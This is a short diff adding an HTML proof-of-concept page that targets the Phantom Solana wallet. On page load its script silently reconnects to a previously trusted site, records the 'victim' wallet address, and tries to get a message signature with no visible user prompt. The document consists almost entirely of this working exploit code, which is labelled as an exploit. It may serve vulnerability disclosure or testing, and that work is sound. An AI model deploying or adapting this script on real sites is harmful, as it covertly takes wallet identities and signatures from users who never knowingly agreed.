@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Silent Reconnect PoC</title>
+</head>
+<body>
+<h2>Silent Reconnect Test</h2>
+<pre id="log"></pre>
+
+<script>
+const log = (msg) => {
+  document.getElementById("log").textContent += msg + "\n";
+};
+
+async function runExploit() {
+  const provider = window.solana;
+
+  if (!provider || !provider.isPhantom) {
+    log("Phantom not found");
+    return;
+  }
+
+  try {
+    // Step 1: Silent reconnect
+    const res = await provider.connect({ onlyIfTrusted: true });
+    log("Silent connect SUCCESS");
+    log("Victim address: " + res.publicKey.toString());
+
+    // Step 2: Silent message signing test
+    const msg = new TextEncoder().encode(
+      "Login verification"
+    );
+
+    const signed = await provider.signMessage(msg, "utf8");
+    log("Silent message signed");
+    log("Signature: " + signed.signature);
+
+  } catch (e) {
+    log("Silent reconnect failed: " + e.message);
+  }
+}
+
+runExploit();
+</script>
+</body>
+</html>
